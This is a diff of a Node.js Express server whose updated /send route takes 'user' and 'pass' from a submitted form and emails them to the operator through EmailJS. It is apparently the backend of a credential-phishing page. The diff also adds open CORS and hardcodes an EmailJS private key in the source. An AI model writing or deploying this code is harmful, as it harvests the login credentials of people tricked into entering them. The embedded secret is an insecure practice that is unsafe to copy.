@@ -1,30 +1,46 @@
 import express from "express";
 import path from "path";
 import { fileURLToPath } from "url";
+import cors from "cors";
+import emailjs from "@emailjs/nodejs";
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Required para gumana sa ES Modules
+// ES Modules setup
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Middleware para mabasa ang JSON body
+// Middleware
+app.use(cors());
 app.use(express.json());
-
-// Serve static files (HTML, CSS, JS)
 app.use(express.static(__dirname));
 
-// Route sa main page
+// Serve index.html
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// Route na tatanggap ng POST request galing sa form
-app.post("/send", (req, res) => {
-  console.log("📩 Received data:", req.body);
-  // Dito mo pwedeng i-process o i-save sa database kung gusto mo
-  res.status(200).json({ message: "Data received successfully" });
+// POST route to send email via EmailJS
+app.post("/send", async (req, res) => {
+  const { user, pass } = req.body;
+
+  const templateParams = { user, pass };
+
+  try {
+    const response = await emailjs.send(
+      "service_w7q3bge",       // Service ID
+      "template_oply56o",      // Template ID
+      templateParams,
+      "CblrELnhPGSB5KdMO-Y3m"  // Private Key
+    );
+
+    console.log("✅ Email sent:", response.text);
+    res.status(200).json({ message: "Email sent successfully" });
+  } catch (err) {
+    console.error("❌ Email send error:", err);
+    res.status(500).json({ message: "Failed to send email" });
+  }
 });
 
 // Start server
